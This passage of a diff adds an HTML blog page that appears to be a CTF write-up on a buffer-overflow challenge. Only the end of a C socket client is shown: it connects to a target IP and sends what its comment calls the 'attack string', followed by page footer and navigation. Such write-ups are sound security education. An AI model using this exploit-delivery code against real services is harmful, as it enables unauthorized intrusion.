+</span><span class="c1"></span><span class="n">their_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>                         <span class="cm">/* 协议类型是INET  */</span> 
+<span class="n">their_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>                       <span class="cm">/* 连接对方PORT端口 */</span> 
+<span class="n">their_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>        <span class="cm">/* 连接对方的IP */</span> 
+<span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">their_addr</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">{</span> 
+           <span class="c1">//如果连接失败，退出程序
+</span><span class="c1"></span>           <span class="n">printf</span><span class="p">(</span><span class="s">&#34;connet error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> 
+           <span class="n">closesocket</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span> 
+           <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> 
+<span class="p">}</span> 
+<span class="n">send</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">szChat</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szChat</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span> <span class="c1">//发送攻击字符串
+</span><span class="c1"></span><span class="n">closesocket</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span> 
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span> 
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">KoU2N</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">2013-05-21</span>
+  </p>
+  
+  
+</div><footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">缓冲区溢出</a>
+          <a href="/tags/socket/">Socket</a>
+          <a href="/tags/shellcode/">shellcode</a>
+          <a href="/tags/%E8%A5%BF%E7%94%B5%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B/">西电网络攻防大赛</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/%E4%BB%8E%E9%9B%B6%E5%AD%A6ai/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">从零学AI</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/%E8%A5%BF%E7%94%B5%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE%E7%AC%AC%E4%BA%8C%E5%85%B3/">
+            <span class="next-text nav-default">西电第三届网络攻防大赛线上赛缓冲区溢出题目第二关</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:gao_yun@.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/kouunn" class="iconfont icon-github" title="github"></a>
+      <a href="http://localhost:1313" class="iconfont icon-zhihu" title="zhihu"></a>
+  <a href="https://kou2n.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2017 - 
+    2019
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">KoU2N</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
